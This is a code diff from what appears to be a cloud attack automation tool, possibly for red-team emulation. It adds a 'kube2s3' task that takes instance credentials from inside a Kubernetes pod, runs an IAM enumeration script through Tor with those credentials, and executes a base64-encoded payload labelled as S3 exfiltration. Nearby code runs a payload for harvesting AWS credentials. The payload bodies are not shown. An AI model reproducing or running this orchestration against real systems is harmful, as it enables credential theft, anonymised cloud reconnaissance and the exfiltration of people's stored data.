@@ -551,7 +551,7 @@ echo $BUCKET_URL
                     jobname="iam2enum",
                     cwd=f'/iam2enum',
                     script=f'iam2enum.sh',
-                    args=""
+                    args="--profile=default"
                 )
                 session.log("iam2enum enumeration complete")
                 session.log(
@@ -571,6 +571,19 @@ echo $BUCKET_URL
                 result = run_base64_payload(
                     session=session, payload=payload, log_name="payload_awscreds")
             elif task_name == "kube2s3":
+                # context here is we're inside pod that has access to s3
+                enum_exfil_prep_creds(csp, task_name)
+                session.log("running iam2enum enumeration...")
+                # here we'll have instance credentials from the pod
+                credentialed_access_tor(
+                    csp=csp,
+                    jobname="iam2enum",
+                    cwd=f'/iam2enum',
+                    script=f'iam2enum.sh',
+                    args="--profile=instance"
+                )
+                session.log("iam2enum enumeration complete")
+
                 tmp_dir = Path("/tmp")
                 # create work directory
                 task_path = Path(f"/{task_name}")
@@ -585,7 +598,7 @@ echo $BUCKET_URL
                 with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'r') as f:
                     payload = f.read()
 
-                session.log("running scan payload...")
+                session.log("running s3 exfil payload...")
                 result = run_base64_payload(
                     session=session, payload=payload, log_name="payload_kube2s3")
                 session.log(result)
